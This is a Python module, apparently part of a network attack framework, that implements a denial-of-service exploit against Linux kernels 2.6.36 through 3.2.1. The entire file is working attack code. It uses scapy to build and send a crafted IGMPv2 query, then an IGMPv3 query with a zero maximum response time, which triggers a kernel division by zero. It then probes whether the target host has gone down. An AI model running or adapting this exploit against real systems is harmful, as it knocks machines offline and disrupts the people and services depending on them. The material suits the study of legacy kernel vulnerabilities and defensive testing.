from dos import DoS
from struct import pack
from socket import inet_aton
from scapy.all import send, IP, conf, checksum
import util


class igmp_nix(DoS):
    """ 
        First send an IGMPv2 query, followed by an IGMPv3 query
        with a max response time of 0; results in a division by
        zero in the kernel
    """
    def __init__(self):
        super(igmp_nix, self).__init__('Linux 2.6.36 - 3.2.1 IGMP DoS')
        conf.verb = 0
        self.info = """
                    Exploits an IGMPv2 DoS in Linux kernel version
                    2.6.36 >= to < 3.2.1.

                    More information on the sploit:
                    http://www.exploit-db.com/exploits/18378/            
                    """

    def initialize(self):
        igmpv2 = pack("!BBH", 0x11, 0xff, 0) + inet_aton("224.0.0.1")
        igmpv3 = pack("!BBH", 0x11, 0x0, 0) + inet_aton("0.0.0.0") \
                                                    + pack("!BBBB", 0, 0, 0, 0)

        igmpv2 = igmpv2[:2] + pack("!H", checksum(igmpv2)) + igmpv2[4:]
        igmpv3 = igmpv3[:2] + pack('!H', checksum(igmpv3)) + igmpv3[4:]

        send(IP(dst=self.target, proto=2) / igmpv2)
        send(IP(dst=self.target, proto=2) / igmpv3)

        if self.is_alive():
            util.Msg('Host still up.')
        else:
            util.Msg('Host not responding - it\'s either down or '
                                                'rejecting our probes.')
